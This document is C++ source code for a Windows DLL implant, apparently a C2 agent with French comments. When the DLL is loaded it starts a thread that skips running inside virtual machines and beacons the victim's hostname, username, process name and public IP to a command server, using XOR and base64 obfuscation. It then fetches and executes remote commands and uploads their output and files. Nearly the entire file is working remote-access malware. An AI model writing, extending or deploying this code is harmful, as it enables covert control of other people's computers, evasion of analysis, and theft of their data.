// Compile with: x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32
#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <vector>
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#ifdef ANTI_VM_ENABLED
extern "C" bool is_virtual_machine();
#endif

using namespace std;

// Helper function to parse types and value from command
void parse_command_type(const string& command, string& types, string& value) {
    size_t sep1 = command.find('\'');
    if (sep1 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep2 = command.find('\'', sep1 + 1);
    if (sep2 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    types = command.substr(sep1 + 1, sep2 - sep1 - 1);

    size_t colon = command.find(':', sep2);
    if (colon == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep3 = command.find('\'', colon);
    if (sep3 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep4 = command.find('\'', sep3 + 1);
    if (sep4 == string::npos) {
        value = command.substr(sep3 + 1);
        size_t end = value.find_last_not_of(" \t\r\n'");
        if (end != string::npos) {
            value = value.substr(0, end + 1);
        }
    } else {
        value = command.substr(sep3 + 1, sep4 - sep3 - 1);
    }
}

// Helper function to extract filename from download command
string extract_filename(const string& command_type, const string& command_value) {
    if (command_type != "download") {
        return "";
    }
    return command_value;
}

/**
 * Envoie un beacon au C2
 */
string send_beacon(const string& agent_id, const string& results_data = "") {
    string hostname = get_hostname();
    string username = get_username();
    string process_name = get_process_name();
    string ip_pub = getPublicIP();

    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"ip_address\":\"" << ip_pub << "\",";
    ss << "\"results\":\"" << results_data << "\"";
    ss << "}";

    string beacon_json = ss.str();
    string xor_encrypted = xor_data(beacon_json, XOR_KEY);
    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        RESULTS_PATH,
        USER_AGENT,
        HEADER,
        b64_encoded
    );

    return response;
}

/**
 * Récupère les commandes en attente
 */
vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
    vector<pair<int64_t, string>> commands;

    ostringstream ss;
    ss << "{\"agent_id\":\"" << agent_id << "\"}";
    string request_json = ss.str();

    string xor_encrypted = xor_data(request_json, XOR_KEY);
    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        "/api/command",
        USER_AGENT,
        HEADER,
        b64_encoded
    );

    if (response.empty()) {
        return commands;
    }

    string xor_response = base64_decode(response);
    string clear_response = xor_data(xor_response, XOR_KEY);

    // Parser le JSON pour extraire les commandes
    size_t commands_pos = clear_response.find("\"commands\":[");
    if (commands_pos == string::npos) {
        return commands;
    }

    size_t pos = commands_pos + 12;

    while (pos < clear_response.length()) {
        while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t' || clear_response[pos] == '\n')) pos++;

        if (pos >= clear_response.length() || clear_response[pos] == ']') break;

        if (clear_response[pos] == ',') {
            pos++;
            continue;
        }

        if (clear_response[pos] == '{') {
            pos++;

            int64_t cmd_id = -1;
            string cmd_text = "";

            while (pos < clear_response.length() && clear_response[pos] != '}') {
                while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                if (clear_response[pos] == ',') {
                    pos++;
                    continue;
                }

                if (clear_response.substr(pos, 5) == "\"id\":") {
                    pos += 5;
                    while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                    size_t end = pos;
                    while (end < clear_response.length() && isdigit(clear_response[end])) end++;
                    cmd_id = atoll(clear_response.substr(pos, end - pos).c_str());
                    pos = end;
                }
                else if (clear_response.substr(pos, 11) == "\"command\":\"") {
                    pos += 11;
                    size_t end = pos;
                    while (end < clear_response.length()) {
                        if (clear_response[end] == '\\') {
                            end += 2;
                            continue;
                        }
                        if (clear_response[end] == '"') break;
                        end++;
                    }
                    cmd_text = clear_response.substr(pos, end - pos);
                    pos = end + 1;
                } else {
                    pos++;
                }
            }

            if (cmd_id != -1 && !cmd_text.empty()) {
                commands.push_back(make_pair(cmd_id, cmd_text));
            }

            pos++;
        } else {
            pos++;
        }
    }

    return commands;
}

/**
 * Soumet les résultats d'une commande
 */
bool submit_result(const string& agent_id, int64_t command_id, const string& output, bool success, const string& types, const string& filename = "") {
    string output_b64 = base64_encode(output);

    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"command_id\":" << command_id << ",";
    ss << "\"output\":\"" << output_b64 << "\",";
    ss << "\"success\":" << (success ? "true" : "false") << ",";
    ss << "\"types\":\"" << types << "\"";

    if (!filename.empty()) {
        ss << ",\"filename\":\"" << filename << "\"";
    }

    ss << "}";
    string result_json = ss.str();

    string xor_encrypted = xor_data(result_json, XOR_KEY);
    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        "/api/result",
        USER_AGENT,
        HEADER,
        b64_encoded
    );

    return !response.empty();
}

/**
 * Fonction principale exportée par la DLL
 */
extern "C" __declspec(dllexport) void agent_run() {
    setvbuf(stdout, NULL, _IONBF, 0);

    #ifdef ANTI_VM_ENABLED
    if (is_virtual_machine()) {
        return;
    }
    #endif

    // Générer l'agent_id
    string agent_id = generate_agent_id();

    // Premier beacon d'enregistrement
    string initial_response = send_beacon(agent_id, "");

    // Boucle principale
    while (true) {
        this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));

        // Étape 1: Heartbeat beacon
        string beacon_response = send_beacon(agent_id, "");

        if (beacon_response.empty()) {
            continue;
        }

        // Étape 2: Récupérer les commandes
        vector<pair<int64_t, string>> commands = fetch_commands(agent_id);

        if (commands.empty()) {
            continue;
        }

        // Étape 3: Exécuter chaque commande
        for (size_t i = 0; i < commands.size(); i++) {
            int64_t cmd_id = commands[i].first;
            string cmd_text = commands[i].second;

            // Parse command
            string cmd_type, cmd_value;
            parse_command_type(cmd_text, cmd_type, cmd_value);

            // Extract filename if download
            string filename = extract_filename(cmd_type, cmd_value);

            // Exécuter la commande
            string result = execute_command(cmd_text);
            bool success = !result.empty();

            // Convertir le type de commande en type de résultat
            string result_type;
            if (cmd_type == "download") {
                result_type = "file";
            } else if (cmd_type == "upload") {
                result_type = "upload_file";
            } else {
                result_type = "text";
            }

            // Étape 4: Soumettre le résultat
            submit_result(agent_id, cmd_id, result, success, result_type, filename);
        }
    }
}

/**
 * Point d'entrée de la DLL
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Créer un thread pour éviter de bloquer le chargement de la DLL
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)agent_run, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
